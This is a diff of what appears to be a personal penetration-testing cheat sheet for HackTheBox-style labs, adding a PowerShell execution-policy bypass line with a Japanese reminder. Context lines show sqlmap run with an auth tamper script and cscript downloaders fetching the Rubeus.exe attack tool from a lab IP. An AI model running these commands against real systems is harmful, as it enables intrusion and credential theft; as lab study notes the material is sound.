@@ -14,7 +14,7 @@ sqlmap -r ./req --tamper=./sqlmap_basic_auth.py --ignore-code=401 --level 5 --ri
 GET http://example.htb/ HTTP/1.1
 Content-Length: 0
 
-...
+---
 Authorization: Basic *
 ```
 ## sqlmap_websocket.py
@@ -74,4 +74,9 @@ cscript.exe /nologo wget.js hxxp://10.11.14.13/Rubeus.exe Rubeus.exe
 
 #VBS
 cscript.exe /nologo wget.vbs hxxp://10.11.14.13/Rubeus.exe Rubeus.exe
+```
+# Powershell
+これを忘れないように
+```
+$ powershell -ep bypass
 ```
